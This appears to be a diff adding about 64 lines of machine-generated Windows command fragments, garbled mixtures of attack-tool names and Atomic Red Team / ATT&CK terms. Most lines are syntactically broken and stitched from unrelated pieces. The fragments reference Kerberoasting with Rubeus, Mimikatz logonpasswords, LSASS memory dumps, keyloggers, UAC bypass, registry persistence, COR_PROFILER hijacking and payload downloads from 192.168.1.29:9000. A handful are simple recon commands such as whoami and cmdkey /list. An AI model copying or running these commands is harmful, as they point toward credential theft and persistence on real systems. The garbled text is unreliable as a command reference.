@@ -1,0 +1,64 @@
+powershell -ibck /user : cor_profiler '' -name $ cor_profiler ''
+conhost.exe [ net.servicepointmanager ] ( objectcategory=computer -accepteula `` http //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+rubeus.exe kerberoast in shadow % -comobject //192.168.1.29:9000/payload/redirect.sdb -o -accepteula c : new-object file c : set-wmiinstance -namespace -arguments $ : \windows\system32\comsvcs.dll -o both ''
+sc query
+% localappdata % \microsoft\teams\current\teams.exe
+net localgroup `` administrators '' -name cor_enable_profiling /grant security file /grant components\atomic_test '' ' -name [ \system32\osk.exe /grant administrators '' -name administrators '' '' /launchargs : # : cor_profiler ''
+bypassuac.exe $ $ '' -c `` domain admins '' '' c session_id /d inprocserver32 ;
+quser
+cmdkey /list
+net localgroup `` administrators '' '' /f /grant administrators administrators '' -name cor_profiler ''
+cmdkey /list
+tasklist
+set windir= $ : cor_profiler '' /grant threadingmodel ''
+conhost.exe [ ] : //192.168.1.29:9000/payload/redirect.sdb -o hkey_current_user\control net.webclient os ; os.system http http http : -r -o $ w32time
+winrar a -ibck -ibck
+net localgroup `` hklm\software\microsoft\command packages '' c $ : cor_profiler '' /grant threadingmodel '' c '' -value 512
+copy git keylogger_dll.dll /out $ `` cor_profiler '' /t select-object -namespace bits_job_name
+colorcpl $ : `` cor_profiler '' c '' root\subscription '' -name reg_dword -c enabled '' root\subscription '' /grant reg_dword /d # { reg_sz -c cor_profiler ''
+remove-item -path `` $ `` 1000 -namespace administrators '' '' -l '' c : -c '' c '' \programdata\microsoft\windows\start \programdata\microsoft\windows\start team ''
+dumpminitool.exe popcalc.dll file c administrators '' '' -name windir /v threadingmodel '' ;
+net localgroup `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam ''
+nbtstat -n output_path
+nbtstat -n
+rundll32 -executionpolicy -verbose
+cscript $ consumer hklm\software\microsoft\windows t1547.009 /nowrap ''
+remove-item -path $ ( $ `` domain } c `` hklm\software\microsoft\windows t1547.009 exe all
+sekurlsa : :credman
+rubeus.exe administrators shadow cor_profiler , keylog
+quser
+reg add `` hklm\software\microsoft\windows username -ibck -name defaultaccount -u ''
+nmap -o | foreach-object objectcategory=computer ) in ; -t c : \programdata\microsoft\windows\start \microsoft\teams\current\teams.exe
+echo `` host `` $ user_name } -l ;
+net localgroup `` hkcu\software\microsoft\windows\currentversion\run '' '' \programdata\microsoft\windows\start red el inputprovider '' /v cor_profiler '' , minidump minidump : options\mshta.exe '' '' /grant team $ true '
+copy powershell `` `` .\lazagne you : //192.168.1.29:9000/payload/redirect.sdb -o -accepteula c : /users
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' \inprocserver32 file /grant keylog
+nbtstat -n -u $ { user_name } -l $ { filename_regex }
+net localgroup `` administrators '' '' nt\currentversion\windows '' c cor_profiler '' ''
+whoami
+net localgroup `` administrators '' -name '' -namespace `` cor_profiler '' '' /f /grant threadingmodel ''
+adfind.exe -f http : :logonpasswords
+net localgroup `` administrators '' /f /grant '' c ads_zip /grant administrators /grant http '' -name administrators '' -name autorun '' file $ # : cor_profiler ''
+net localgroup `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest ''
+cmdkey /list
+$ shortcut = `` http http //192.168.1.29:9000/payload/redirect.sdb -o ) //192.168.1.29:9000/payload/evil.exe -o t1547.009 -o
+psexec.exe \\ $ target `` hklm\software\microsoft\windows `` http hklm\software\microsoft\windows wscript.shell '' \software\microsoft\command @ \users\ in '' $ hklm\software\microsoft\windows os ; os.system ( ' ] pnpclass = //192.168.1.29:9000/payload/redirect.sdb -o = $ : .id $ username ) ;
+iediagcmd.exe /out
+nmap -o $ : -o : @ '' $ administrators '' ; in administrators '' ; /user administrators '' /o '' @ administrators '' ''
+vsiisexelauncher.exe -p -a `` $ cor_profiler '' -name $ ;
+import-module .\screencap.ps1
+net localgroup `` administrators '' c '' nt\currentversion\image file file -class __eventfilter -namespace administrators '' c '' -namespace cor_profiler '' /t enabled '' c `` atomictest.dll '' ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution file execution lsass ; querylanguage= createobject : \windows\temp\lsass_dump.dmp
+net localgroup `` administrators '' '' cor_profiler
+nbtstat -n $ 1 /d `` $ { user_name }
+copy-item `` $ shadow shadow copy t1547.009 -arguments createobject ( `` defaultaccount \inprocserver32 , keylog
+adfind.exe -f http : :logonpasswords
+net localgroup `` administrators '' /v cor_profiler '' /t inputprovider '' '' '
+auditpol http : :securityprotocol \\ $ _.mainwindowtitle net.webclient -new nt\currentversion\winlogon\notify\atomicredteam '' ' ' = set-wmiinstance /grant minidump ( get-process lsass ; full /grant kerberoast ' = [ net.securityprotocoltype ] pnpclass = select-object -expandproperty ''
+vsiisexelauncher.exe -p $ target t1547.009 name you copy \users\
+iediagcmd.exe /out -p $ { filename_regex } -l $ filterargs
+[ hklm\systyem '' //192.168.1.29:9000/payload/redirect.sdb -o $ { time } -l in '' $ ( ; ; -t in $ i = ; querylanguage= ; -t $ env : ; in administrators $ { copy volumn name or \system32\osk.exe
+remove-item -path c : -accepteula : \microsoft\teams\current\teams.exe
+rubeus.exe shadow localappdata % \microsoft\teams\current\teams.exe
+namp -sn -l $ target t1547.009 \programdata\microsoft\windows\start options\osk.exe '' '' \programdata\microsoft\windows\start team ''
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
